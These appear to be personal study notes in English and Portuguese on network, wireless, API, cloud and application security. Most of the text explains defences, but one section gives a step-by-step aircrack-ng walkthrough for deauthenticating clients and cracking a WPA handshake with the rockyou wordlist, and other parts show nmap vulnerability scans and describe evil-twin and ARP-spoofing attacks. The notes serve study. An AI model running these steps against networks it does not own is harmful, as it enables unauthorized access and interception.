<span style="color: #98971a">Next Generation Firewalls</span> <span style="color: #3588E9">--></span> can be a combination of all the ones above while also performing deep packet inspection on lower level do discover malicious packets that are being sent. The goal of these type of firewall is to include more protection for each OSI layer compared to having different types of firewalls each used for one specific thing.
###### <strong style="color:#689d6a">Network Security with Nmap</strong>

<span style="color: #d65d0e">Nmap</span> is a common tool that both cyber security experts and ethical hackers use and it is used to scan a certain device or multiple devices for open ports and it can also be used to discover certain vulnerabilities on those open ports as well as services running.

<code style="color:#689d6a">nmap -T4 -F scanme.nmap.org</code> <span style="color: #3588E9">--></span> Quick Scan

<code style="color:#689d6a">nmap -T4 -A -v scanme.nmap.org</code> <span style="color: #3588E9">--></span> Intense Scan

```bash
# scan on selected ports:
nmap 192.168.0.1 -p 80,90,100

# scan a range of ports:
nmap 192.168.0.1 -p 80-120

# scan for the top 100 ports of the target machine:
nmap 192.168.0.1 -F 

# most often scans: -sS/sT
# -sS is a TCP SYN scan --> will perform the first part of the TCP handshake.
# -sT is the full connect scan

# SYN scan --> needs root privileges
sudo nmap -sS 192.168.0.1 # less detected

# -sV --> scan that will perform the version discovery on services running on open ports.
nmap -sV 192.168.0.1

# -O --> to discover the target's operating system
sudo nmap -O 192.168.0.1 # it isn't always accurate

# -A --> stands for all, it will scan for ports, versions, for OS.
nmap -A
```

<strong style="color: #C6554F">Obs</strong>: only use nmap on the target that are inside in the local network.

There are certain <span style="color: #98971a">script scans</span> that can be used with nmap tool.

```bash
# to find vulnerabilities:
nmap --script vuln 192.168.0.0
```
###### <strong style="color:#689d6a">Secure Network Architecture</strong>

When it comes about the <span style="color: #98971a">Router</span>, it's important to change its password and to update its firmware. It's also important to have a good router <span style="color: #3588E9">--></span> manufactures build and distribute these network devices such as routers with exploitable softwares just so they can have ease of installation, operation and maintenance.

Common types of routers are also main target of the attackers since they are widely distributed. It's a good idea to get a device from some less known vendor. Many services inside the network come with default passwords but they also come with default settings.

Something that should be done usually in company networks, is <strong style="color:#d79921">network segmentation</strong>, if set properly, can prevent an intruder from executing exploits and laterally moving around the network. If it's poorly set, the attacker could extend their impact and gain control of multiple devices.

The most obvious of network segmentation is physical separation of devices. Another form of separations is using <span style="color: #98971a">VLANs</span> to isolate users form the rest of the domains. This virtual type of separation is logically separating different devices on the same physical network.

The company network can have a special server that provides authentication, authorization, and accounting services to store access information for network device management.

The passwords of accounts that are being stored in databases should be all hashed and salted, and also it's a good idea to have them in a backup in a protected offline device.

It's also important to always verify integrity of hardware and software that is being implemented inside the network. Bigger companies do this usually by maintaining strict control of supply chain and purchases only from authorized resellers, and upon installation inspecting all the devices for any sign of tampering.

When <strong>downloading</strong> a software is good to perform <span style="color: #98971a">hash verification</span> to see if that software itself has been modified during the download.

<span style="color: #3588E9">--></span> 100% security is not possible but we can always end up scaling up and making it more and more secure.
###### <strong style="color:#689d6a">Wireless Security</strong>

<span style="color: #d65d0e">WEP</span> was the first wireless security protocol that has been widely used. Today it has bunch of threats an it is highly unlikely that an access point still uses WEP.

Most commons one are <span style="color: #d65d0e">WPA</span> and <span style="color: #d65d0e">WPA2</span>. WPA was adopted as an alternative to WEP, it uses 256-bit encryption technology and it first introduced WPA personal for home wireless access points and WPA for larger companies. WPA2 which is the version 2 of WPA, came with a little improvement when it added the advanced encryption standard also known as <span style="color: #d65d0e">AES</span> which provides higher security and performance, but it has some security issues.

<span style="color: #d65d0e">WPA3</span> was introduced in 2018 with some improvements in the protection against dictionary types of the attacks which were common with WPA2. Even in home networks WPA3 will automatically encrypt connection without any need for credentials which could be stolen.

<span style="color:#d65d0e">WPS</span> feature should be deactivated. An attacker could exploit a weakness in the WPS feature, this can be done by <span style="color: #C6554F">brute force</span> the <strong>eight digit pin</strong> used on the WPS authentication process. An hacker can brute force this pin in relatively short time (in an average of 10 hours), once he get the right pin he can use a tool called <span style="color: #98971a">reaver</span> to reverse engineer the pin and get the key, this is all possible due to the fact that the WPS feature uses an easy pin (only 8 characters and only contains digits).

<span style="color: #3588E9">--></span> In normal use of an <span style="color: #98971a">Access Point</span> a device will connect to an SSID that it wants to join and after the credentials have been exchanged the access point will grant access to that device to join the network.

Most common attacks: <span style="color: #C6554F">evil twin attack</span>, <span style="color: #C6554F">brute force attack</span>.

<span style="color: #C6554F">evil twin attack</span> <span style="color: #3588E9">--></span> the attacker creates his own fake access point with the same SSID and make sure he either has the stronger signal than the original access point or he comes closer to the target. This is because a device will automatically connect to the stronger access point that he sees with the same SSID in case the autconnect option is on (common in most of the devices). This will result into target connection straight to the attacker access point without the uses of that device even noticing. Once the target connects to the fake access point, the attacker can the send a fake portal requiring the user to input the access point credentials for whatever reason. After capturing the credentials, the attacker can log in to the original access point on his own.

To <strong>prevent</strong> against an <span style="color: #C6554F">evil twin attack</span>: always connect to our own hotspot or our own access point, avoid using unsecured hotspots that have no security at all, disable the auto-connect on the device, use a vpn encrypted traffic.

<span style="color: #C6554F">brute force attack</span> <span style="color: #3588E9">--></span> is possible since the attacker can steal the hashed value of the access point credentials and brute force it until he gets that in plain text. The only requirement for this type of attack, it that the attacker is close to the WiFi during the first part of the attack. An attack can send a <span style="color: #689d6a">deauthentication packet</span> without being connected to the access point which will then automatically disconnect the already connected devices from the WiFi. For and attacker to perform this attack he must have a wireless card that supports monitor mode and packet injection. After the deauthentication the devices will try to reconnect to the access point by performing a four-way handshake where it exchanges the key. In this moment the attacker will try to steal this handshake and store inside a file for later use(convert the hash password into text file).

To <strong>prevent</strong> against a <span style="color: #C6554F">brute force attack</span>: change default passwords, make password strong and almost impossible to brute force, enable mac address whitelist and blacklist.
###### <strong style="color:#689d6a">Wireless Attack Example</strong>

Steps: <span style="color: #d79921">put the card in monitor mode</span> <span style="color: #3588E9">--></span> <span style="color: #d79921">sniff all of the information around</span> <span style="color: #3588E9">--></span> <span style="color: #d79921">pick the access point to attack (check out the the channel which is running and it's MAC address)</span> <span style="color: #3588E9">--></span> <span style="color: #d79921">run the sniffing program and run the deauthetication attack simultaneously</span> <span style="color: #3588E9">--></span> <span style="color: #d79921">crack the password</span>.

<span style="color: #3588E9">--></span> In this case, the attack will be on the personal access point, otherwise it's illegal.

```bash
# put the card on monitor mode
sudo ifconfig wlo1 down
sudo ifconfig wlo1 mode monitor
sudo ifconfig wlo1 up

sudo airmon-ng check wlo1

# kill the processes
sudo airmong-ng check kill

# check if the card is in monitor mode
sudo iwconfig

# put the card back in monitor mode
sudo ifconfig wlo1 down
sudo ifconfig wlo1 mode monitor
sudo ifconfig wlo1 up

# start sniffing all the information
sudo airodump-ng wlo1
# the column ESID informs the access point name
# the column CH is the channel

# sniff the access point
sudo airodump-ng -c <channel_number> --bssid <MAC_address> -w <FILE_name> wlo1
# -w option stands for the file name where all of the info will be written

# Disconnect everyone from the access point
sudo aireplay-ng -0 0 -a <MAC_address_access_point> wlo1

# password list
locate rockyou.txt
cp rockyou.txt /home/$USER/Desktop
gzip -d rockyou.txt.gz

# use the tool aircrack to crack the password
sudo aircrack-ng -w rockyou.txt <File>.cap
```
###### <strong style="color:#689d6a">Network Monitoring</strong>

Tools for network monitoring: <span style="color: #98971a">Wireshark</span>, <span style="color: #98971a">TCPdump</span>, <span style="color: #98971a">Tshark</span>. Run these tools from an endpoint device, it will only monitor traffic from that device, but if they are run from a router or firewall then it will be able to monitor the traffic from all the devices inside the network.

In case a malware is running on an endpoint device, the malware could technically be programmed to evade the monitoring tools if they are running on that endpoint device as well. So it might not be able to see the correct network traffic. But if the monitoring tools are put to run from the router, it will be possible to see the valid traffic going from and coming out to that machine.

If the router doesn't have a GUI option to see the network traffic, then it will be necessary to log in to the router, whether it being through ssh or something else and run the command line monitoring tools from there instead.

running <span style="color: #98971a">TCPdump</span> on the router:
- <span style="color: #3588E9">--></span> in case the router doesn't have tcpdump installed, it needs to be installed first.
```bash
# checkout all the settings:
tcpdump -h 

# to show the interfaces on the machine:
tcpdump -D

# sniff all the traffic on the interface:
sudo tcpdump -i eth0

# to show the IP address instead fo the domain
sudo tcpdump -n -i eth0

# filter the traffic by a port :
sudo tcpdump -n -i enp0s3 dst port 80

# see the external traffic comming to the Local network:
sudo tcpdump -i enp0s3 not src net 192.168.0.0/24

# shows the manual:
man tcpdump
```
###### <strong style="color:#689d6a">Common Network Attacks</strong>

The <span style="color: #C6554F">man-in-the-middle</span> attack is a threat to all the devices on the network, since it's an attacker trying no sniff data and traffic incoming and outgoing, form one or all the machines on the network.

The network attacks can be divided into most common, which are <span style="color: #C6554F">denial of service(DDoS)</span>, where larger botnets simply overload the traffic and make a service or entire network unusable or unreachable. And there are the <span style="color: #C6554F">man-in-the-middle</span> attack, and the <span style="color: #C6554F">unauthorized access</span> attack, which can refer to an endpoint device or router being compromised, whether through a vulnerability or through a weak password.

<span style="color: #C6554F">man-in-the-middle</span> <span style="color: #3588E9">--></span> considering that the attacker on the same network, the easiest way is to do so, is to manipulate <span style="color: #98971a">APR packets</span>. So the attacker would send ARP responses to different devices (to the victim and to the router) and pretend to be someone else and the device that attacker send the ARP responses to, will accept that as a correct input for their ARP table. To the router he would send an ARP response saying that he is the victim, and to the victim he would send the ARP response saying that he is router. Their ARP tables would ten generate these entrances and from this point all the packets that the victim machine is sending would go to the attacker's machine, who would then be able to inspect them and see all data that is not encrypted in plain text. Same goes for traffic that is going to the target machine. <span style="color: #3588E9">--></span> this can be done by an attacker who is targeting one, two or all devices on the network.

<span style="color: #98971a">APR packets</span> are used inside the network so each device can find another device that it wants to communicate with. The way a device finds out which device has which IP address is by sending ARP request and getting back ARP responses. ARP request is simply a device asking the network who is someone. This would be sent out to the broadcast and once the machine that has the wanted IP responds back, we would then know the MAC address that belongs to that IP and vice versa.

Every device has <span style="color: #98971a">ARP tables</span>, where it maps the MAC address to the device's current IP address and it does that for all the devices that it needs to communicate with.

To <strong>prevent</strong> the a <span style="color: #C6554F">man-in-the-middle</span> attack: have strong credentials for access point, have strong router login credentials, visit only https website and use an VPN.
## **API Security**
---
###### <strong style="color:#689d6a">Codificação Base64</strong>

Método utilizado para converter dados binários em texto e vice-versa.

Base64 é muito utilzado na Internet pois vários protocolo de aplicação aceitam aoenas dados em texto (email, http). É usado com o padrão MIME.

É um algoritmo que codifica algo sem a necessidade de chave, mas não é um forma de criptografia.
###### <strong style="color:#689d6a">Public Key Infrastrcture (PKI)</strong>

Conjunto de entidades (servidores), que geram o que se entende por certificados digitais

<span style="color: #d65d0e">ICP Brasil</span> <span style="color: #3588E9">--></span> Infraestrutura de chaves públicas do governo brasileiro.

É um tipo certificado utilizado para fazer criptografia de mensagem enviadas pela internet

chave privada A --> assinatura digital --> documento assinado --> criptografia simétrica --> documento cifrado
###### <strong style="color:#689d6a">HTTP Authentication</strong>

processo para verificar a identidade do usuario de uma aplicação Web.

- <strong style="color:#d79921">Basic Authentication</strong>
	- Em aplicações mais simples o protcolo http oferece uma autenticação básica (Basic) --> exibe um tela de login pelo proprio browser e a informação (string codificada em Base64) é enviada via requisição  para o servidor.
	- A autenticação Basic utiliza um cabeçablho "Authorization" sempre que receber um status 401 ou 403. Exemplo: <code>Athorization: Basic Um9tbWVsO1NlbmhhQDEyMw==</code>
	- Se a informação nao estiver trafegando via HTTPS, a senha do usuário fica exposta na requisião.
	- <code>401 unauthorized HTTP/1.1/WWW-Autehnticate: Basic reaml="pucminas.com.br"</code>
	- WWW-Autehnticate --> cabeçalho da reposta que exige o envio de dados de autenticaçao
	- Realm --> definiÇão do espaço protegido pela autenticaçao
---
- <strong style="color:#d79921">Digest Authentication</strong>
	- cliente e servidor não trocam informações de senha, apenas o hash
	- quando o cliente recebe uma resposta negativa, é feito um procesamento de usuário, senha e nonce --> no qual um hash é gerado, sendo enviado na requisiçao um Authorization Digest com o nome de usuário, o nonce e o proprio hash. 
	- Note: Não há trafegfo de senhas, não é enviado a nenhum proxy e não é jogado na rede. <code>Authorization: username="Rommel" nonce="", response=""</code>
---
- <strong style="color:#d79921">Bearer Authentication</strong>
	- autenticação com token do portador --> se trata em muitas casos de uma API
	- o usuário entra em uma aplicação com a senha, e a senha é passada a um authorization server que gera um token. Esse token é utilizada pela aplicação para solicitar um recurso ao sercidor (servidor de recursos). A passagem da token é feita por meio de Authorization com Bearer. <code>Authorization: Bearer 6mF_0.B5f-4.1JqM (token)</code>
	- É a autenticação preferida ao se trabalhar com identificação de usuários em APIs.
###### <strong style="color:#689d6a">JSON WEB Token (JWT)</strong>

padrão que define uma forma compacta e segura de transferencia de informações baseada em tokens no formato JSON, utilizado em mecanismos de autenticação e autorização.

- <strong style="font-weight: 600">Estrutura básica de token JWT:</strong> { header }  { payload }  { signature }
	- { header } --> informaçoes sobre o itpo da token e algoritmo de criptografia
	```json
	base64enc ({
	  "alg": "HS256",
	  "typ": "JWT"
	})
	```
	- { payload }  --> Dados (claims) que podem ser reservados, públicos ou privados. É a informação entregada 
	```json
	base64enc ({
	  "alg": "HS256",
	  "roles": "JWT" // papel do usuario no sitema 
	})
	```
	- { signature } --> assinatura da token que envia alterações
	```json
	HMACSHA256 (
	base64enc (header) + "." + 
	base64env (payload),
	secretkey
	)
	```
	- Camplos reservados (claims)
		- Iss(Issuer) -- emisor da token JWT
		- Sub (Subject) -- Assucnto da token
		- Aud (Audience) -- identifica o publico para qual a token foi emitida
		- Exp (Epiration Time) -- horario de experiaç!ao da token, a partir do qual não é mais aceita
		- Iat (Issued At) -- horário em que a token foi emitida

A token possui uma assinatura que somente o gerador da token consegue valida-lá.

Ferramentas para validar a token: <span style="color: #98971a">JWT.io</span>

Em implementação com node, uma chave é gerada para assinatura. O pacote jsonwebtoken, permite assinar e validar.
> <code style="color:#689d6a">node -e "console.log(require('crypto').randomBytes(256).toString('base64'));"</code>
###### <strong style="color:#689d6a">Open Authorization (OAuth)</strong>

<span style="color: #d65d0e">Framework aberto</span> criado pelo IETF (RFC 6749), voltado para autenticação e autorização no contexto de soluções digitiais (recursos na Web).

- <strong style="font-weight: 600">Características:</strong>
	- Evita exposição de senhas <span style="color: #3588E9">--></span> a senha não é trafegada no momento em que uma aplicação acessa recursos de outra, a senha é utilizada em unico ponto.
	- Baseado no uso de tokens e Autenticação Bearer
	- Facilita a interoperabilidade (Web, Mobile, Server)
	- Controla a validade e o esopo do acesso concebido
---
- <strong style="color: #d79921">Papéis definidos pelo OAuth</strong>
	- <span style="color: #98971a">Dono do Recurso</span> <span style="color: #3588E9">--></span> entidade que possui recursos na rede e pode ser solicitado a autorizar o acesso a estes recursos protegidos. Exemplo: Usuário final.
	- <span style="color: #98971a">Aplicação Cliente</span> <span style="color: #3588E9">--></span> aplicações utilizadas para acessar recursos na rede. Podem ser confidenciais ou públicos. Ex: aplicações móveis e sites na Web.
	- <span style="color: #98971a">Servidor de Recursos</span> <span style="color: #3588E9">--></span> sistema que mantém recursos na Internet e pode fornecer tais recursos por autorização do dono. Ex: Google Photos.
	- <span style="color: #98971a">Servidor de Autorização</span> <span style="color: #3588E9">--></span> sistema que controla a geração de tokens de acesso para as aplicações cliente. Ex: Google Accounts.

<strong style="color: #d79921">Fluxo geral</strong>
> Aplicação Cliente ----{ req autorização } ---> Dono do Recurso ----{ autoriza }----> Aplicação Cliente ---- { req token} ---> Servidor de Autorização ---- { envia token } ---> Aplicação Cliente ---- { encaminho token } ---> Servidor de Recursos ----{ envia recurso }---> Aplicação Cliente

<span style="color: #98971a">Access token</span> <span style="color: #3588E9">--></span> credencial para acesso a um recurso protegido. É uma string em formato específico de acordo com a aplicação em questão. Uma Access Token é obtida de acordo com o tipo de autorização. A Access Token substitui a necessidade de usuário e senha.

- <strong style="color: #d79921">Tipos de Autorização</strong>
	- <span style="color: #98971a">Código de Autorização:</span> Aplicação Cliente é uma aplicaçao Web ou nativa e mantem uma chave secreta. Ex: Site X acessa os dados de um usuario no facebook.
	- <span style="color: #98971a">Autorização Implítica:</span> Aplicação Cliente é baseada no bwoser e não pode manter uam chave secreta. Ex: Single Page Application
	- <span style="color: #98971a">Credenciais do Usuário:</span> Aplicação Cliente é proxima do Servidor de Autorização e requer usuário e senha, normalamente ambos feitas pela mesma empresa. Ex: Aplicativo "Gerenciador de Negocios" do Facebook.
	- <span style="color: #98971a">Credenciais do Cliente:</span> Aplicação Cliente é a proprietária dos recrusos e não o usuári ofinal. Ex: Cloud Azure acessando dados em storage interno.
###### <strong style="color:#689d6a">Cross-Origin Resource Sharing (CORS)</strong>

<span style="color: #d65d0e">CORS</span> é um <strong style="color: #d79921">mecanismo de segurança sobre HTTP</strong> que permite páginas de um "site A" acessarem rescursos de um "site B".

<span style="color: #98971a">same-origin police</span> <span style="color: #3588E9">--></span> política dentro dos navegadores, que restringe que sites acessem recursos de outros servidores, o site só pode acessar o recurso no servidor em que ele esta hospedado. Com isso, o navegador evita que scripts maliciosos possam pegar dados que estão sendo transacionados e passe esses dados para outras coisas.

O CORS defini dois tipos de <strong style="color: #d79921">requisições</strong>: <span style="color: #98971a">Simples</span> e <span style="color: #98971a">Preflighted</span>
- <span style="color: #98971a">Preflighted</span> <span style="color: #3588E9">--></span> requer verificação de acesso via método OPTIONS.

O <span style="color: #98971a">módulo cors</span> no Node.JS <span style="color: #3588E9">--></span> trata a negociação HTTP para chamadas cross-origin.
## **Cloud Security**
---
Although third-party cloud computing providers follow security best practices and ensure the integrity of their servers, data asset management is still the responsibility of the organization availing these services.

- Identifying the right cloud security solution requires various considerations:
	- lack of visibility in a public cloud environment.
	- multitenancy in a public cloud environment
	- access management and shadow IT.
	- misconfigurations of assets are also accountable for breached records in a cloud environment. They include inappropriate privacy settings or retaining default administrative passwords.

Threats and risks in cloud computing. Insider threats --> anyone who has had access to systems or networks in the past

Distribute-denial-of-service (DDoS) --> The attack works through Simple Network Management Protocol (SNMP) used for modems, printers, switches, routers, and servers.

A DDoS attack targets the server on the enterprise by overloading it with traffic from multiple synchronized systems

The cloud faces another critical risk and that is data breach. A breach can be due to a leak in the cloud security measures used by your organization. Malicious users may gain access to sensitive data and misuse the information

A shared responsibility model is a cloud security framework where the organization hands off certain IT security responsibilities to the cloud computing provider. Each party, the cloud provider and the user are accountable for different aspects of the security, and they work together for the full security coverage

- There are different types of shared security models for IaaS, PaaS, and SaaS:
	- In IaaS, the provider looks after the physical security of the infrastructure at their data centers. IaaS users are responsible for the security of the software including the OS required to run their applications and their data
	- In PaaS, the provider secures the platform including the OS, user subscriptions and login credentials, but the user is responsible for the security of any code or data -- or other content -- produced on the platform
	- in SaaS, the provider is responsible for almost every aspect of security, including underlying infrastructure, service application, and the data the application produces. Users still have some security responsibilities such as protection of login credentials

hybrid cloud environment --> require a robust data-centric cybersecurity program to protect your data, require centralized visibility and monitoring against unauthorized access, exposure, or data theft across your enterprise data environment.

- Data security capabilities:
	- improve maturity across people, process, and technology
	- Identify your most critical data assets, who has access to them, and how they are protected
	- prevent data loss by detecting, preventing, and enforcing policy violations to avoid accidental data loss
	- Implement data security governance by establishing process, metrics, and continuous steady-state data discovery and classification
	- monitor database security by enforcing data protection and compliance policies across hybrid cloud environments

develop Cloud identity and access management (IAM) strategies that provide and work on zero trust architecture, risk protection, and constantly authenticate any user to any resource.

stablish a zero-trust implementation that will provide a centralized access control, preserve client confidentiality, reduce insider threats, and secure your remote resources

cloud network security which refers to the security measures, technology, policies, controls, and processes used to protect data on public, private, and hybrid cloud networks

- Best practives:
	- 1 phase --> identifying your cloud usage state and risks
		- Identifying how your data is accessed
		- Detecting unknown cloud usage
		- Checking your configurations for cloud services
		- Monitoring for signs of malicious usage of cloud data
	- 2 phase --> protecting your cloud system
		- Assigning protection policies
		- Encrypting sensitive data
		- Formulating policies for data sharing
		- Restricting data sharing to unknown devices
		- Implementing a bot protection and mitigation solution
		- Using a proper anti-malware solution
	- 3 phase -> responding to attacks
		- add additional authentication and verifications steps for high-risk access scenarios
		- add new policies for new cloud services

The National Institute of Standards and Technology (NIST) has made a list of best practices and principles that establish a secure and sustainable cloud computing framework. These principles are NIST's five pillars of a cybersecurity framework: Identify, Protect, Detect, Respond, and Recover.

CSPM --> emerging technology in cloud security

cloud security posture management (CSPM) solutions are designed to address a common error in many cloud environments, that is, misconfigurations

A policy in cloud security refers to a set of rules and guidelines that determine how users should access and protect resources within a cloud environment. provide a framework for maintaining security, ensuring compliance with industry regulations, and mitigating potential risks

customers can implement their own policies, also known as customer-managed policies. These policies allow customers to tailor security measures according to their requirements, industry regulations, and risk tolerance

principle of least privilege --> dictates that organizations should grant users only the minimum necessary permissions required to perform their tasks

User Access Level --> vary depending on their roles and responsibilities

Tipos de usuários: Administrative users, developers users, application users.
###### Identity and Access Management (IAM)

Enables organizations to manage and authenticate users’ identities and access to resources in a cloud environment. It involves the processes and policies that ensure that only authorized individuals have access privileges to sensitive systems, applications, and data.

also know as access control

Authentication, or the identity service, enables applications deployed to the cloud to authenticate users at an application level, based on a range of identity providers, suach as cloud directory.

Sometimes API keys, or unique identifiers are passed into an API to identify the calling application or user

Multifactor authentication is used to combat identity theft by adding an additional layer of authentication for application users, such as single-use passwords or pins, certificates, tokens

Cloud Directory services are used to securely manage user profiles and their associated credentials and password policy inside a cloud environment. A directory service within a cloud means that applications hosted on the cloud do not need to use their own user repository

Reporting helps provide a user-centric view of access to resources or a resource-centric view of access by users

Reports typically give information about which users have access to which resources, which users have changes in access rights, which access is being exploited by each user, and under which conditions

Audit and compliance is a critical service within identity and access management framework, both for cloud provider, and cloud consumer. Auditors use these processes to validate implemented controls against an organization's security policy, industry compliance, and risk policies

An access group is a group of users and service IDs created so that the same access can be assigned to all entities within the group with one or more access policies

Access policies define how users, service IDs, and access groups in the account are given permission to access account resources

Policies include: a subject, which can be users, service IDs, or access groups; a target, which is the resource or provisioned service offering, to which you want to provide access; and role, which defines the actions allowed on the target of the policy, that is, the resource to which the access is being granted.

authentication and authorization might sound similar, they are distinct security processes in the world of identity and access management (IAM). Autentication confirms users are how they say they are, while authorization gives users permission to access a resource. In secure environments, authorization must always follow authentication. Users should first prove that their identities are genuine before an organization’s administrators grant them access to the requested resources.

standard password policy --> ensure strong password security for the users
###### Cloud Encryption

encryption --> scrambling data in a way that makes it illegible.

Two parts of a encryption system: encryption algorithm and decryption key.
- The encryption algorithm defines the rules by which data will be transformed so that it becomes illegible.
- the decryption key defines how the encrypted data will be transformed back to legible data

Encryption ensures that only authorized users have access to sensitive data and when accessed or intercepted without authorization, data is unreadable and meaningless.
###### Cloud Monitoring

Cloud monitoring solutions assess data, application, and infrastructure behaviors for: performance, resource allocation, network availability, compliance, and security risks and threats.

 It includes the strategies, practices, and processes that need to be in place for analyzing, tracking, and managing cloud-based services and applications.

Accelerate the diahnosis and resolution of performance incidents

Control the cost of your monitoring infra

mitigate the impacy of abnormal situatons with proactive notifications

Get critical Kubernetes and container insights for dynamic microservice monitoring

Troubleshoot your applications and infrastructure

--> Cloud monitoring solutions are designed to give organizations visibility and control over their entire cloud-based infrastructure.

Application Performance Monitoring, or APM, measures application availability and performance, providing tools needed to troubleshoot issues in an application's environment.

- Best Pratcies:
	- Leverage en-user experience monitoring solutions
	- Move all aspects of infrastrcuture under one moniroting program.
	- Use monitoring tools that keep help track usage and cost.
	- Increase cloud monitoring automation
	- Simulate outages and breach scenarios
###### Identity providers standards (SAML, OpenID)

Security Assertion Markup Language (SAML) --> s an XML-based standard for exchanging authorization and authentication data between IdPs and SPs. It enables secure single sign-on (SSO) and identity federation. SAML allows users to authenticate once with their IdP and access multiple SPs without needing separate authentication

OpenID Connect --> modern standard built on the OAuth 2.0 protocol. It provides a framework for authentication and identity federation. OpenID Connect allows users to authenticate using their chosen OpenID provider and obtain an ID token that contains information about their identity.
## **Application Security**
---
Scanning software should include the application's code base and all relevant resources, such as containers and container images, either statically or dynamically. Additionally, software licenses should also be analyzed to keep software compliant

<span style="color: #d65d0e">Defect-tracking</span> tools help software developers <strong style="color: #b16286">categorize the severity of the vulnerabilities</strong>. Ex: Jira and Bugzilla. Moreover, defect tracking tools offer centralizing vulnerabilities organization-wide for multiple developers to implement within their software development.

<strong style="color: #d79921">Prioritizing vulnerabilities</strong>
- Mission-critical ---> High severity --> Medium severity ---> Low severity
###### <strong style="color: #689d6a">Security Testing</strong> 

<span style="color: #3588E9">--></span> procedures for comparing the states of an application or system. It provides a secure code baseline for development.

> <strong style="color:#c6554f">Note:</strong> It reduce risk of impact from new code.

Security Testing takes place <strong style="color:#d79921">during the Test stage</strong> of the SDLC.

<strong style="font-weight: 600">Steps</strong>
- Provide a baseline
- Compare states

- <span style="color: #98971a">Functional security</span> <span style="color: #3588E9">--></span> expectation of behavior when a software or a system is tested. It should be an integral part of the security testing processes. To be performed, it needs a list of the functional requirements.
	- <strong style="font-weight: 600">Types:</strong>
		- <span style="color: #98971a">Ad hoc testing</span> <span style="color: #3588E9">--></span> specialized testing upon discovery of a vulnerability.
		- <span style="color: #98971a">Exploratory testing</span> <span style="color: #3588E9">--></span> takes place outside of formal testing. Ex: testing a theory or testing an idea.

<span style="color: #3588E9">--></span> Automated frameworks can be used for automating security tests of an application or system.
- <span style="color: #98971a">BDD-Security</span>: uses behaviour driven development
- <span style="color: #98971a">Mittn</span>: works in continuous integration
- <span style="color: #98971a">Guanlt</span>: Hooks into security tools
<br>
- <strong style="font-weight: 600">Mitigation strategies</strong>
	- Use JSON for API data payloads
		- <strong style="color:#c6554f">Obs:</strong> it allows simplistic data encoding in key-value pairs instead of complex nested elements and slower parsing.
	- Implment secure code practices
	- Use automated vulnerability scanners
	- Include threat modeling
		- to gain a clear understanding of the behavior of bad actors
	- Maintain awareness of the OWASP Top 10
###### <strong style="color: #689d6a">Static Analysis</strong> 

<span style="color: #3588E9">--></span> examining all code or runtime binaries to help detect common vulnerabilities.

It's a debugging method that automatically inspects source code before execution. It's also known as source code analysis.

<span style="color: #98971a">Static Application Security Testing</span> or (SAST) tool, examines source code to identify security flaws that render an organization's applications vulnerable to attack. Provides APIs that don't require code to be complete.

> Extremely effective in detecting problems in code that have been evaluated manually.

Takes place <strong style="color:#d79921">during the Develop stage</strong> of the SDLC.

- <strong style="font-weight: 600">Tools:</strong>
	- <span style="color: #98971a">SonarQube</span> <span style="color: #3588E9">--></span> open-source platform for continuous code quality assessment.
		- SonarQube depends on a database to work correctly.
		- It can run in a docker container without a database, but is a best practice to use an external database, even for local development.
	- Examine the code statically of the file system.
	- Indentify codes that are not executing as static.

- <strong style="font-weight: 600">Benefits:</strong>
	- Depth --> covers most avenues of code execution; indicates where possible problems may exist in the code.
	- Speed --> quickly identifies issues early on.
	- Accuracy --> less errors than results of manual code reviews, higher quality results
###### <strong style="color: #689d6a">Dinamic Analysis</strong> 

<span style="color: #3588E9">--></span> process of testing and evaluating an application as it is executing.

It is typically run against fully built applications, and it's performed in staging, pre-prod, or even after the code is deployed to production.

<span style="color: #98971a">Dynamic Application Security Testing</span> (DAST), evaluates the application from the outside on through the front end. It acts like an attacker. It simulates attacks to detect potential threats and vulnerabilities.
- It performs black-box testing, analyzing behaviors of inputs and outputs.
- Use the number next to the vulnerability name to read about it <span style="color: #3588E9">--></span> <code>https://www.zaproxy.org/docs/alerts/{NUMBER}</code>

- <strong style="font-weight: 600">Benefits:</strong>
	- Crawls an application's interface in a dynamic manner
		- examines code from the root URL
		- tries to break into the system
		- identifies breakpoints and vulnerabilities to patch up
	- Performs tests that provide insights
		- reveals how the application reacts to various inputs
	- Helps flush out fault in dynamic code paths
		- helps in the detection of errors that other tests may miss
		- gives a clear idea about the changes that may need to be made
###### <strong style="color: #689d6a">Vulnerability Analysis</strong> 

<span style="color: #3588E9">--></span> method of identifying possible application flaws that could jeopardize the application.

Code can contain loopholes that someone may find and exploit

Software-as-a-service (SASS) platforms like <span style="color: #98971a">Snyk</span> provide developer security features

- <strong style="font-weight: 600">Tools</strong>
	- <span style="color: #98971a">Burp Suite</span> <span style="color: #3588E9">--></span> Automated or manual website scanning
		- Auditing for vulnerabilities
	- <span style="color: #98971a">Nessus</span> <span style="color: #3588E9">--></span> Vulnerability scanner for Mac, Linux, and Windows
		- Scripting language and plugins
	- <span style="color: #98971a">Zed Attack Proxy (Zap)</span> <span style="color: #3588E9">--></span> Open Source vulnerability scanner by OWASP
		- Active and passive scanning of HTML and AJAX
<br>
- <strong style="font-weight: 600">Best practices</strong>
	- performing policy analysis and updating
	- automating the process
###### <strong style="color: #689d6a">Vulnerability Scanning</strong> 

<span style="color: #3588E9">--></span> the search for security vulnerabilities from within the code and from the outside of an application.

<strong style="color:#d79921">Common coding vulnerabilites</strong> to scan: SQL injection, Cross-site scripting and Path traversal of files and directories in web applications.

- <strong style="font-weight: 600">Guidelines</strong>
	- To develop a secure design, vulnerability scans needs to be based on a specific platform configuration, the patch levels, or application composition.
	- Use credentials to query for detailed application information.
	- Span application, app stack, and all supporting platforms.
<br>
- <strong style="font-weight: 600">Tools:</strong>
	- <span style="color: #98971a">Coverity</span> <span style="color: #3588E9">--></span> Incremental analysis scanner for languages like C/C++, Java, and Python.
	- <span style="color: #98971a">Jake</span> <span style="color: #3588E9">--></span> Community-created, open source tool that is designed to check Python environments for vulnerabilities. It uses the <br>Sonatype OSS Index.
		- <code style="color: #689d6a">pip install jake</code>
		- <code style="color: #689d6a">jake ddt</code>
			- <code style="color: #d65d0e">ddt</code> mode does static scanning for vulnerable dependencies
	- <span style="color: #98971a">CodeSonar</span> <span style="color: #3588E9">--></span> Abstract modeling scanner for paths and variables in code. It uses abstraction to model the code and find any weaknesses in paths and program variables.
	- <span style="color: #98971a">Snyk Code</span> <span style="color: #3588E9">--></span> integrated development tool that performs semantic analysis to discover coding and security bugs throughout the development phase.
